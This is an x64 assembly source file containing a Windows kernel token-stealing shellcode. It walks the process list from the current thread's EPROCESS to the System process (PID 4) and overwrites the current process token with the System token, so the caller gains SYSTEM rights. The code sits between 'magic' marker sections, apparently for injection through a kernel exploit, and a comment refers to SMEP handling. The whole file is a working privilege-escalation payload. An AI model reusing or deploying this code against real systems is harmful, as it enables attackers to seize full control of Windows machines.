; TODO: re-enable smep, regard token counter
SECTION .start_magic     
db "magic1" 


SECTION .text
;db 0xcc

start:
	xor rax, rax
	mov rax, [gs:rax + 188h]		; gs[0] == KPCR, Get KPCRB.CurrentThread field
	mov rax, [rax+0xb8]		; Get (KAPC_STATE)ApcState.Process (our EPROCESS)
	mov r9, rax;			; Backup target EPROCESS at r9
	
	; loop processes list
	mov rax, [rax + 0x448]	; +0x448 ActiveProcessLinks : _LIST_ENTRY.Flink; Read first link
	mov rax, [rax]			; Follow the first link
system_process_loop:
	mov rdx, [rax - 0x8]	; ProcessId
	mov r8, rax;			; backup system EPROCESS.ActiveProcessLinks pointer at r8
	mov rax, [rax]			; Next process
	cmp rdx, 4			; System PID
	jnz system_process_loop
	
	; We're in the right KPROCESS
	
	mov rdx, [r8 + 0x70]
	and rdx, 0xfffffffffffffff8			; Ignore ref count
	mov rcx, [r9 + 0x4b8]
	and rcx, 0x7
	add rdx, rcx				; put target's ref count into our token
	mov [r9 + 0x4b8], rdx		; rdx = system token; KPROCESS+0x4b8 is the Token, KPROCESS+0x448 is the process links - 0x70 is the diff
	
	; restore normal operation
	xor rax, rax
	
	;db 0xcc
	retn
	
	
SECTION .end_magic     
db "magic2" 

	